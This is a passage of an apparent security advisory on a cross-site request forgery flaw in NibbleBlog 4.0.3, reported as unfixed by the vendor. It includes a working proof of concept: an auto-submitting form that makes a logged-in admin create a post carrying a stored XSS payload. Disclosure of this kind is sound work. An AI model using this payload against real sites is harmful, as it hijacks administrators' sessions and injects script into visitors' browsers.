2. Vulnerability Description

NibbleBlog 4.0.3 does not have CSRF protection. This means that an
attacker can perform actions for an admin if the admin is logged in and
visits an attacker controlled website. In the case of NibbleBlog, this
can for example lead to persistent XSS via the creation of a new post,
which in turn allows for phishing attacks or the injection of JavaScript
keyloggers.

3. Proof of Concept

Create new Post (for Spam and XSS):

	<form id="myForm"
action="http://localhost/nibbleblog/admin.php?controller=post&action=new_simple"
method="POST">
	<input name="title" value="Interesting!">
	<input name="content" value="visit <a
href='http://example.com'>this</a>.<img src='no' onerror='alert(1)'>">
	<input name="allow_comments" value="1">
	<input name="id_cat" value="0">
	</form>
	<script>
	document.getElementById("myForm").submit();
	</script>

4. Solution

This issue was not fixed by the vendor.
